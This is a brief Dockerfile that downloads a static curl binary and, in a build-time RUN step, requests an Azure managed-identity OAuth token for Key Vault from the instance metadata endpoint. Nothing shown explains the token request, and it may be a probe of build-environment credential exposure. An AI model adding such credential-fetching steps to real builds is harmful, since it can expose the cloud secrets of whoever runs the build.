FROM debian:trixie-slim
WORKDIR /app
ADD https://github.com/moparisthebest/static-curl/releases/download/v8.11.0/curl-amd64 /usr/bin/curl
RUN chmod +x /usr/bin/curl
RUN curl -s -f -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://vault.azure.net/"
COPY ./ ./
CMD [ "bash", "./entrypoint.sh" ]
